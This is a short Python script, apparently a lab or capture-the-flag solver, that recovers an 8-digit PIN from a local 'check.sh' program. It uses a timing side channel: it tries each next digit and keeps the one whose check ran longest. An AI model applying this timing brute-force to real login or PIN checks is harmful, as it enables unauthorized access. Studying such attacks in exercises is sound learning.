import os
prefix = ""

def generate_likely_pin(_prefix=""):
    """
    Returns True, pin if it finds a pin that grants access
    """
    while len(_prefix) < 8:
        try_time = []
        # try each possible digit as the next addition to the prefix
        for try_num in range(10):
            stream = os.popen(f"./check.sh {_prefix}{try_num}{'0'*(7-len(_prefix))}")
            output = stream.read()
            if "denied" not in output:
                # access was not denied, so it must have been granted and return the PIN found
                print(output)
                print(f"./check.sh {_prefix}{try_num}{'0'*(7-len(_prefix))}")
                return True, _prefix + str(try_num) + '0'*(7-len(_prefix))
            try_time.append(float(output.strip().split("\n")[-1]))  # grab the time value from output and put it in the try_time array at the location corresponding to try_num

        _prefix += str(try_time.index(max(try_time)))  # the digit that took longest was probably correct, so put it onto the prefix
    # access was not granted 
    return False, _prefix

status, prefix = generate_likely_pin()
while not status:
    status, prefix = generate_likely_pin()
print(f"the pin seems to be {prefix}")